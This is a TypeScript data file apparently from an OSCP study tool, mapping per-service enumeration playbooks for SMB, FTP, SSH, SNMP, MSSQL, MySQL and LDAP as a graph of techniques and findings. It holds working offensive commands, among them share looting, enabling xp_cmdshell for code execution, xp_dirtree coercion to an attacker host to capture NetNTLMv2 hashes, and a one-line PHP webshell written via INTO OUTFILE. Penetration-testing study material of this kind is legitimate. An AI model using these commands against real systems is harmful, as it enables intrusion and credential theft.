import type { OscpContent } from '@/types/oscp'

/** Phase: per-service enumeration playbooks. */
const serviceEnum: OscpContent = {
    nodes: [
        {
            id: 'smb-enum',
            title: 'Enumerate SMB',
            type: 'technique',
            phase: 'service-enum',
            os: 'windows',
            description:
                'Check the version (ms17-010), then list shares and users - anonymously and with any creds you hold.',
            commands: [
                {
                    label: 'Version + vuln scripts',
                    code: 'nmap -p445 --script "smb-os-discovery,smb-protocols,smb-vuln-ms17-010" <target>',
                },
                {
                    label: 'List shares (null / guest / creds)',
                    code: `smbclient -L //<target>/ -N
netexec smb <target> -u '' -p '' --shares
netexec smb <target> -u guest -p '' --shares`,
                },
                {
                    label: 'Full enum',
                    code: 'enum4linux-ng -A <target>',
                },
            ],
            tags: ['smb', 'netexec', 'crackmapexec', 'enum4linux', 'shares'],
        },
        {
            id: 'smb-anon-access',
            title: 'Anonymous/guest SMB access',
            type: 'finding',
            phase: 'service-enum',
            os: 'windows',
            description:
                'A null or guest session lists (and maybe reads/writes) shares. Loot every readable share; a writable share in a web root or startup path is a foothold.',
            commands: [
                {
                    label: 'Connect + recurse a share',
                    code: `smbclient //<target>/<share> -N
smb: \\> recurse ON
smb: \\> prompt OFF
smb: \\> mget *`,
                },
                {
                    label: 'Mirror a whole share',
                    code: "netexec smb <target> -u '' -p '' -M spider_plus",
                },
            ],
            tags: ['smb', 'null-session', 'guest', 'shares', 'loot'],
        },
        {
            id: 'ms17-010',
            title: 'SMB version is vulnerable',
            type: 'finding',
            phase: 'service-enum',
            os: 'windows',
            description:
                'Old SMBv1 (ms17-010 EternalBlue) or a flagged CVE. Go straight to a public exploit.',
            tags: ['ms17-010', 'eternalblue', 'cve', 'smbv1'],
        },
        {
            id: 'ftp-enum',
            title: 'Enumerate FTP',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'Try anonymous login; note the exact banner (vsftpd 2.3.4 is a backdoor). Check whether the FTP root is the web root - a writable one = webshell.',
            commands: [
                {
                    label: 'Anonymous login',
                    code: `ftp <target>       # user: anonymous, pass: anything
# or non-interactive:
wget -m --no-passive ftp://anonymous:anonymous@<target>`,
                },
            ],
            tags: ['ftp', '21', 'anonymous', 'vsftpd'],
        },
        {
            id: 'ftp-anon-writable',
            title: 'FTP anonymous + writable',
            type: 'finding',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'You can upload. If the FTP directory is served by the web server, drop a webshell and browse to it.',
            tags: ['ftp', 'upload', 'webshell'],
        },
        {
            id: 'ssh-enum',
            title: 'Enumerate SSH',
            type: 'technique',
            phase: 'service-enum',
            os: 'linux',
            description:
                'Grab the version and supported auth methods. Password auth -> brute a known user. Found a private key elsewhere? Use it here.',
            commands: [
                {
                    label: 'Auth methods',
                    code: 'ssh -v <user>@<target>   # watch for publickey/password',
                },
            ],
            tags: ['ssh', '22', 'openssh'],
        },
        {
            id: 'snmp-enum',
            title: 'Enumerate SNMP',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'With a community string (try public), walk the MIB for users, running processes (with full command lines - often creds), installed software and listening ports.',
            commands: [
                {
                    label: 'Walk everything',
                    code: `snmpwalk -c public -v2c <target>
# targeted: users, processes, installed software, ports
snmpwalk -c public -v2c <target> 1.3.6.1.4.1.77.1.2.25    # users
snmpwalk -c public -v2c <target> 1.3.6.1.2.1.25.4.2.1.2   # processes`,
                },
                {
                    label: 'Brute community strings',
                    code: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>',
                },
            ],
            tags: ['snmp', '161', 'udp', 'snmpwalk', 'community'],
        },
        {
            id: 'mssql-enum',
            title: 'Enumerate MSSQL',
            type: 'technique',
            phase: 'service-enum',
            os: 'windows',
            description:
                'With creds, log in and check impersonation and xp_cmdshell. Even without RCE, xp_dirtree/xp_fileexist to a UNC path you control captures NetNTLMv2.',
            commands: [
                {
                    label: 'Connect',
                    code: 'impacket-mssqlclient <user>:<pass>@<target> -windows-auth',
                },
                {
                    label: 'RCE via xp_cmdshell',
                    code: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';`,
                },
                {
                    label: 'Coerce NetNTLMv2 (no RCE needed)',
                    code: "EXEC xp_dirtree '\\\\<kali-ip>\\share', 1, 1;   # capture with responder",
                },
            ],
            tags: ['mssql', '1433', 'xp_cmdshell', 'impacket'],
        },
        {
            id: 'mysql-enum',
            title: 'Enumerate MySQL',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'Log in with any creds. FILE privilege enables INTO OUTFILE (write a webshell into the web root) and LOAD_FILE (read files).',
            commands: [
                {
                    label: 'Connect + write webshell',
                    code: `mysql -h <target> -u <user> -p
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/sh.php';`,
                },
            ],
            tags: ['mysql', '3306', 'outfile', 'file-priv'],
        },
        {
            id: 'ldap-enum',
            title: 'Enumerate LDAP',
            type: 'technique',
            phase: 'service-enum',
            os: 'ad',
            description:
                'An open 389/636 usually means a Domain Controller. Try an anonymous bind and dump the naming context - user lists and description-field passwords fall out here.',
            commands: [
                {
                    label: 'Anonymous bind + base',
                    code: `ldapsearch -x -H ldap://<target> -s base namingcontexts
ldapsearch -x -H ldap://<target> -b "DC=corp,DC=com" "(objectClass=user)" sAMAccountName description`,
                },
            ],
            tags: ['ldap', '389', '636', 'dc', 'ldapsearch'],
        },
        {
            id: 'public-exploit-search',
            title: 'Search for a public exploit',
            type: 'technique',
            phase: 'service-enum',
            os: 'agnostic',
            description:
                'Match the exact product + version to a known exploit. Read the PoC before running it - fix the target IP/port, LHOST, and any hardcoded offsets; run untrusted PoCs in a throwaway VM.',
            commands: [
                {
                    label: 'searchsploit',
                    code: `searchsploit <product> <version>
searchsploit -m <id>          # copy PoC locally
searchsploit -x <id>          # read it first`,
                },
            ],
            references: [
                { label: 'Exploit-DB', url: 'https://www.exploit-db.com/' },
            ],
            tags: ['searchsploit', 'exploit-db', 'cve', 'poc'],
        },
    ],
    edges: [
        { from: 'smb-enum', to: 'smb-anon-access', label: 'null/guest allowed' },
        { from: 'smb-enum', to: 'ms17-010', label: 'SMBv1 / CVE flagged' },
        { from: 'ms17-010', to: 'public-exploit-search', label: 'grab the PoC' },
        {
            from: 'smb-anon-access',
            to: 'creds-found',
            label: 'creds in a file on the share',
        },
        {
            from: 'smb-anon-access',
            to: 'ad-null-enum',
            label: 'domain? enumerate users',
        },
        {
            from: 'smb-anon-access',
            to: 'webshell-upload',
            label: 'writable share in web root',
        },
        { from: 'ftp-enum', to: 'ftp-anon-writable', label: 'anon + write' },
        { from: 'ftp-enum', to: 'creds-found', label: 'config/creds on FTP' },
        {
            from: 'ftp-anon-writable',
            to: 'webshell-upload',
            label: 'FTP dir = web root',
        },
        { from: 'ftp-enum', to: 'hydra-brute', label: 'brute a known user' },
        { from: 'ssh-enum', to: 'hydra-brute', label: 'password auth open' },
        {
            from: 'ssh-enum',
            to: 'foothold-linux',
            label: 'valid key or creds',
        },
        { from: 'snmp-enum', to: 'user-list', label: 'users harvested' },
        { from: 'snmp-enum', to: 'creds-found', label: 'creds in process args' },
        {
            from: 'mssql-enum',
            to: 'foothold-windows',
            label: 'xp_cmdshell RCE',
        },
        {
            from: 'mssql-enum',
            to: 'netntlm-captured',
            label: 'xp_dirtree coercion',
        },
        { from: 'mysql-enum', to: 'webshell-upload', label: 'INTO OUTFILE' },
        { from: 'ldap-enum', to: 'ad-null-enum', label: 'anonymous bind works' },
        { from: 'ldap-enum', to: 'user-list', label: 'user list dumped' },
        {
            from: 'public-exploit-search',
            to: 'foothold-linux',
            label: 'exploit lands (Linux)',
        },
        {
            from: 'public-exploit-search',
            to: 'foothold-windows',
            label: 'exploit lands (Windows)',
        },
    ],
}

export default serviceEnum
